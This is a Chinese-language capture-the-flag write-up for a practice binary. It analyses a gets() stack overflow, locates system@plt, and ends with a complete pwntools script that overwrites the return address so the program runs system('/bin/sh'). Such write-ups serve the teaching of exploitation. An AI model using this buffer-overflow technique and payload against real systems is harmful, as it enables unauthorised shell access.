#### [ad0472 输入/bin/sh](https://adworld.xctf.org.cn/media/file/task/53c24fc5522e4a8ea2d9ad0577196b2f)
1. 分析过程
   查看main函数：
   ```c
   char *hello()
    {
        __int16 *v0; // eax
        int v1; // ebx
        unsigned int v2; // ecx
        __int16 *v3; // eax
        __int16 s; // [esp+12h] [ebp-26h] BYREF
        int v6; // [esp+14h] [ebp-24h] BYREF

        v0 = &s;
        v1 = 30;
        if ( ((unsigned __int8)&s & 2) != 0 )
        {
            s = 0;
            v0 = (__int16 *)&v6;
            v1 = 28;
        }
        v2 = 0;
        do
        {
            *(_DWORD *)&v0[v2 / 2] = 0;
            v2 += 4;
        }
        while ( v2 < (v1 & 0xFFFFFFFC) );
        v3 = &v0[v2 / 2];
        if ( (v1 & 2) != 0 )
            *v3++ = 0;
        if ( (v1 & 1) != 0 )
            *(_BYTE *)v3 = 0;
        puts("please tell me your name");
        fgets(name, 50, stdin);
        puts("hello,you can leave some message here:");
        return gets((char *)&s);
        }
   ```
   忽略前面一堆没用的东西，直接看最后几行
   ```c
    puts("please tell me your name");
    fgets(name, 50, stdin);    // 将输入值存在name变量里面
    puts("hello,you can leave some message here:");
    return gets((char *)&s);   // 注入点
    ```
    并且查到一个后门system调用：
    ```c
    int pwn()
    {
        return system("echo hehehe");
    }
    ```
    直接查找plt表中system的地址，查到system地址为0x08048420：
    ```shell
    └─$ objdump -d -j .plt ./pwn | grep system
    08048420 <system@plt>:
    ```
    思路很清晰，将/bin/sh输入到name里面，然后s覆盖返回地址为system调用地址，同时传入name为system调用参数。  
    检查name、s对应栈地址，name的地址在bss段0x0804A080，s需要0x26+0x4（32位）覆盖到r（返回地址）
    ```
    .bss:0804A080 name            db 34h dup(?)
    ```
    ```
    -00000026 s               dw ?
    -00000024                 db ? ; undefined
    ...
    -00000001                 db ? ; undefined
    +00000000  s              db 4 dup(?)
    +00000004  r              db 4 dup(?)
    +00000008
    +00000008 ; end of stack variables
    ```
2. exp.py
    ```python
    from pwn import *
    io = process('./pwn')
    io.recvuntil(b"please tell me your name")
    io.sendline(b"/bin/sh")          # 输入/bin/sh到name
    binsh_addr = 0x0804A080          # 没开地址随机化，找到name变量地址
    system_addr = 0x08048420         # plt表中pwn的调用地址
    payload = b"a" * (0x26+0x4) + p32(system_addr) + p32(0) + p32(binsh_addr)
                                     # 参考上面的system注入公式
    io.recvuntil(b"hello,you can leave some message here:")
    io.sendline(payload)
    io.interactive()
    ```   
